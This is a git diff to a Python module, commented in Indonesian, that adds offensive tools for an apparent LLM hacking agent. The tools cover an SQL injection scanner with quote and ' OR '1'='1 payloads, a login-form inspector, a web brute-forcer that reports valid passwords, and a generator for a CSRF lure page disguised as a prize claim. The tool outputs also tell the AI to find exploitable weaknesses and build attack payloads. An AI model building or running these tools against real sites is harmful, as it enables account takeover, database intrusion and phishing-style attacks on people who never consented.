@@ -1,8 +1,12 @@
 import hashlib
 import asyncio
+import re
+import json
+from duckduckgo_search import DDGS
 import aiosqlite
 import aiohttp
 import asyncio
+from ddgs import DDGS
 from memory import DB_NAME, cek_memori_hash
 import numpy as np
 from sklearn.metrics.pairwise import cosine_similarity
@@ -55,6 +59,157 @@ async def tool_baca_panduan(pertanyaan: str) -> str:
             
     except FileNotFoundError:
         return "❌ [ERROR] File dokumen_rahasia.txt belum dibuat."
+
+async def tool_scrape_web(target_url: str) -> str:
+    """
+    Mengambil isi sebuah website dan mengekstrak teksnya untuk mencari petunjuk.
+    """
+    print(f"🕸️ [EKSEKUTOR] Mengumpulkan intelijen dan membedah isi {target_url}...")
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(target_url, timeout=10) as response:
+                html = await response.text()
+                
+                # 1. Hapus isi dari tag <script> dan <style> yang bikin pusing
+                html_bersih = re.sub(r'<script.*?</script>', '', html, flags=re.DOTALL | re.IGNORECASE)
+                html_bersih = re.sub(r'<style.*?</style>', '', html_bersih, flags=re.DOTALL | re.IGNORECASE)
+                
+                # 2. Hapus semua sisa tag HTML (<...>)
+                teks_mentah = re.sub(r'<[^>]+>', ' ', html_bersih)
+                
+                # 3. Rapikan spasi berlebih
+                teks_rapi = re.sub(r'\s+', ' ', teks_mentah).strip()
+                
+                # 4. Potong teks agar otak AI tidak pingsan (Batas 1000 karakter)
+                if len(teks_rapi) > 1000:
+                    teks_rapi = teks_rapi[:1000] + "\n... [TEKS DIPOTONG] ..."
+                    
+                return (
+                    f"✅ [HASIL SCRAPING DARI {target_url}]:\n"
+                    f"{teks_rapi}\n\n"
+                    f"(Sistem -> AI: Analisis teks di atas! Cari kata-kata penting, petunjuk login, atau kelemahan yang bisa dieksploitasi.)"
+                )
+    except Exception as e:
+        return f"❌ [ERROR] Gagal melakukan scraping. Detail: {e}"
+
+async def tool_pencarian_internet(query: str) -> str:
+    """
+    Alat OSINT untuk melacak informasi di internet (Google/DuckDuckGo) secara real-time.
+    """
+    print(f"🌐 [OSINT] Mengerahkan radar ke internet untuk melacak: '{query}'...")
+    
+    try:
+        # DDGS (DuckDuckGo Search) mencari secara anonim
+        with DDGS() as ddgs:
+            # Mengambil 3 hasil teratas agar AI tidak kepenuhan memori
+            results = list(ddgs.text(query, max_results=3))
+            
+        if not results:
+            return f"❌ [OSINT] Tidak ada jejak digital yang ditemukan untuk '{query}'."
+            
+        # Merangkum hasil pencarian ke dalam format yang mudah dibaca AI
+        laporan = f"✅ [HASIL OSINT UNTUK: '{query}']\n\n"
+        for i, res in enumerate(results):
+            laporan += f"[{i+1}] {res['title']}\n"
+            laporan += f"Ringkasan: {res['body']}\n"
+            laporan += f"Sumber URL: {res['href']}\n"
+            laporan += "-" * 30 + "\n"
+            
+        laporan += "\n(Sistem -> AI: Baca data intelijen di atas, ekstrak informasi yang relevan, dan laporkan dengan bahasa yang luwes kepada Bos!)"
+        return laporan
+        
+    except Exception as e:
+        return f"❌ [ERROR OSINT] Radar mengalami gangguan: {str(e)}"
+
+async def tool_scan_sqli(target_url: str) -> str:
+    """
+    Pendeteksi celah SQL Injection. Mengirim payload ringan (tanda kutip)
+    untuk melihat apakah database membocorkan pesan error SQL.
+    Hanya untuk edukasi dan audit keamanan (bukan eksploitasi/pencurian data).
+    """
+    print(f"💉 [EKSEKUTOR] Memulai pemindaian celah SQLi pada {target_url}...")
+    
+    # Payload pancingan standar untuk memecahkan query database
+    payloads = ["'", "\"", "' OR '1'='1", "') OR ('1'='1"]
+    
+    # Kata kunci error dari berbagai jenis database (MySQL, PostgreSQL, dll)
+    sql_errors = [
+        "you have an error in your sql syntax",
+        "warning: mysql",
+        "unclosed quotation mark after the character string",
+        "quoted string not properly terminated",
+        "pg_query()",
+        "sqlite3.operationalerror"
+    ]
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            for payload in payloads:
+                # Menempelkan payload di akhir URL
+                test_url = f"{target_url}{payload}"
+                async with session.get(test_url, timeout=5) as response:
+                    teks_balasan = await response.text()
+                    teks_lower = teks_balasan.lower()
+                    
+                    # Mengecek apakah ada database error yang bocor ke HTML
+                    for error in sql_errors:
+                        if error in teks_lower:
+                            return (
+                                f"🚨 [CRITICAL ALERT] Celah SQL Injection Ditemukan!\n"
+                                f"Target: {target_url}\n"
+                                f"Payload yang memicu error: {payload}\n"
+                                f"Pesan Error Database: '{error}'\n"
+                                f"(Sistem -> AI: Laporkan kepada Bos bahwa sistem ini sangat rentan dan bisa dibobol penuh! Berikan saran mitigasi.)"
+                            )
+                            
+                # Jeda agar tidak dianggap spam
+                await asyncio.sleep(0.3)
+                
+            return f"✅ [AMAN] Tidak ditemukan indikasi celah SQL Injection dari payload dasar pada {target_url}."
+            
+    except Exception as e:
+        return f"❌ [ERROR] Gagal memindai target: {str(e)}"
+
+async def tool_inspeksi_html(target_url: str) -> str:
+    """
+    Mengambil raw HTML dari URL dan mengekstrak informasi form, action, method, dan input.
+    """
+    print(f"🔍 [EKSEKUTOR] Menginspeksi elemen form pada {target_url}...")
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            # Otomatis mengikuti redirect jika dilempar ke /login
+            async with session.get(target_url, timeout=10) as response:
+                html = await response.text()
+                url_akhir = str(response.url) # Mendapatkan URL asli setelah redirect
+                
+                # Ekstrak semua form dari HTML
+                forms = re.findall(r'<form.*?</form>', html, flags=re.DOTALL | re.IGNORECASE)
+                
+                if not forms:
+                    return f"✅ [HASIL INSPEKSI]: Tidak ditemukan tag <form> di {url_akhir}."
+                
+                hasil = f"✅ [HASIL INSPEKSI DARI {url_akhir}]:\nDitemukan {len(forms)} form:\n"
+                for i, form in enumerate(forms):
+                    # Cari kemana form ini dikirim (action)
+                    action = re.search(r'action=["\'](.*?)["\']', form, flags=re.IGNORECASE)
+                    # Cari metodenya (POST/GET)
+                    method = re.search(r'method=["\'](.*?)["\']', form, flags=re.IGNORECASE)
+                    # Cari semua parameter input (name="")
+                    inputs = re.findall(r'<input[^>]+name=["\'](.*?)["\']', form, flags=re.IGNORECASE)
+                    
+                    act_str = action.group(1) if action else "Tidak tertulis (biasanya dikirim ke URL ini sendiri)"
+                    meth_str = method.group(1) if method else "GET"
+                    
+                    hasil += f"\n--- Form {i+1} ---\n"
+                    hasil += f"Target URL (Action) : {act_str}\n"
+                    hasil += f"Metode Request      : {meth_str.upper()}\n"
+                    hasil += f"Parameter Input     : {', '.join(inputs) if inputs else 'Tidak ditemukan'}\n"
+                
+                return hasil + "\n\n(Sistem -> AI: Gunakan informasi ini untuk menyusun payload serangan!)"
+    except Exception as e:
+        return f"❌ [ERROR] Gagal melakukan inspeksi. Detail: {e}"
     
 async def tool_crack_md5(target_hash: str, wordlist: list) -> str:
     """
@@ -180,46 +335,98 @@ async def tool_analisis_keamanan(target_url: str) -> str:
 
 async def tool_bruteforce_web(target_url: str, username: str, wordlist: list) -> str:
     """
-    Fungsi untuk melakukan brute force pada halaman login sebuah website.
-    AI akan memanggil ini jika mendeteksi form login.
+    Versi Upgrade: Melakukan brute force dengan deteksi kegagalan yang lebih akurat
+    untuk web modern (Node.js/Vercel).
     """
-    print(f"⚙️ [EKSEKUTOR] Memulai serangan Web Brute Force ke {target_url} untuk user '{username}'...")
-    
-    # Kita menggunakan aiohttp ClientSession agar koneksi jauh lebih cepat
+    print(f"⚙️ [EKSEKUTOR] Memulai serangan Web Brute Force v2.0 ke {target_url}...")
+    print(f"👤 User: '{username}' | 📝 Wordlist: {len(wordlist)} kata")
+
+    # Kita gunakan cookie jar agar sesi tetap terjaga jika diperlukan
     async with aiohttp.ClientSession() as session:
         for password in wordlist:
-            # Data yang biasanya dikirim saat form login di-submit (POST)
             payload = {
                 "username": username,
                 "password": password
             }
             
             try:
-                async with session.post(target_url, data=payload, timeout=2) as response:
+                # Kita set allow_redirects=True untuk melihat apakah kita dilempar ke /home
+                async with session.post(target_url, data=payload, timeout=5) as response:
+                    final_url = str(response.url)
                     teks_balasan = await response.text()
                     teks_balasan_lower = teks_balasan.lower()
                     
-                    # LOGIKA SUKSES
-                    if "selamat" in teks_balasan_lower or "buka kado" not in teks_balasan_lower:
-                        # Kita tambahkan teks_balasan ke dalam output!
+                    # --- LOGIKA DETEKSI KEGAGALAN (Negative Markers) ---
+                    # Jika ada kata-kata ini, berarti 100% GAGAL
+                    fail_markers = ["salah", "gagal", "invalid", "incorrect", "error", "tidak ditemukan"]
+                    is_failed = any(marker in teks_balasan_lower for marker in fail_markers)
+                    
+                    # --- LOGIKA DETEKSI SUKSES (Positive Markers) ---
+                    # 1. Jika URL berubah (misal dari /login ke /home)
+                    # 2. Jika ada kata kunci keberhasilan
+                    is_redirected = "/home" in final_url or "/dashboard" in final_url
+                    success_markers = ["selamat", "logout", "profil", "welcome", "authenticated"]
+                    is_success_text = any(marker in teks_balasan_lower for marker in success_markers)
+
+                    if (is_redirected or is_success_text) and not is_failed:
                         return (
-                            f"🔥 [BERHASIL] Login Web tembus!\n"
-                            f"🎯 Target: {target_url}\n"
-                            f"🔑 Password: {password}\n"
-                            f"📄 [RESPON SERVER]:\n"
-                            f"{'-'*40}\n"
-                            f"{teks_balasan.strip()}\n"
-                            f"{'-'*40}"
+                            f"✅ [STATUS: SUKSES TOTAL]\n"
+                            f"Sistem berhasil dibobol!\n"
+                            f"Target: {final_url}\n"
+                            f"Username: {username}\n"
+                            f"Password Valid: {password}\n"
+                            f"(Sistem -> AI: Berhenti mencari! Laporkan ke Bos bahwa misi sukses dan berikan password valid di atas!)"
                         )
                     
-                    print(f"   [INFO] Mencoba '{password}'... Gagal.")
+                    print(f"   [INFO] Mencoba '{password}'... Gagal (Respon: {response.status})")
+                    
             except Exception as e:
-                return f"❌ [ERROR] Gagal menghubungi target {target_url}. Pastikan server menyala. Detail: {str(e)}"
+                return f"❌ [ERROR] Masalah koneksi: {str(e)}"
             
-            # Memberikan jeda sangat kecil agar tidak dituduh DDoS oleh server lokal sendiri
-            await asyncio.sleep(0.1)
+            # Jeda agar tidak terkena rate limiting (blokir IP) oleh Vercel
+            await asyncio.sleep(0.3)
 
-    return f"❌ [GAGAL] Seluruh wordlist telah dicoba untuk '{username}'. Tidak ada yang cocok."
+    return f"❌ [GAGAL] Seluruh wordlist dicoba. Tidak ada yang cocok untuk user '{username}'."
+
+async def tool_exploit_csrf(target_url: str, params: any) -> str:
+    """
+    Menghasilkan halaman HTML eksploitasi CSRF dengan proteksi tipe data.
+    """
+    print(f"☣️ [EKSEKUTOR] Merakit halaman jebakan CSRF untuk {target_url}...")
+    
+    # PERBAIKAN: Jika params dikirim AI sebagai string, ubah ke dictionary
+    if isinstance(params, str):
+        try:
+            # Mengubah string menjadi dictionary
+            params = json.loads(params.replace("'", '"')) 
+        except:
+            return "❌ [ERROR] AI mengirim parameter dalam format teks yang rusak."
+
+    # Sekarang aman untuk menjalankan .items()
+    form_inputs = ""
+    try:
+        for key, value in params.items():
+            form_inputs += f'<input type="hidden" name="{key}" value="{value}">\n        '
+    except AttributeError:
+        return "❌ [ERROR] Parameter yang dikirim AI bukan format key-value yang benar."
+
+    # ... (sisanya sama seperti sebelumnya) ...
+    html_exploit = f"""
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Klaim Hadiah Anda!</h1>
+    <form id="csrf-form" action="{target_url}" method="POST">
+        {form_inputs}
+        <button type="submit">Klik di Sini</button>
+    </form>
+</body>
+</html>
+"""
+    with open("jebakan_csrf.html", "w") as f:
+        f.write(html_exploit)
+        
+    return f"✅ [SUKSES] File 'jebakan_csrf.html' berhasil dibuat untuk target {target_url}."
 
 async def cek_port(ip: str, port: int) -> int:
     """Fungsi internal pembantu untuk mengecek satu port"""
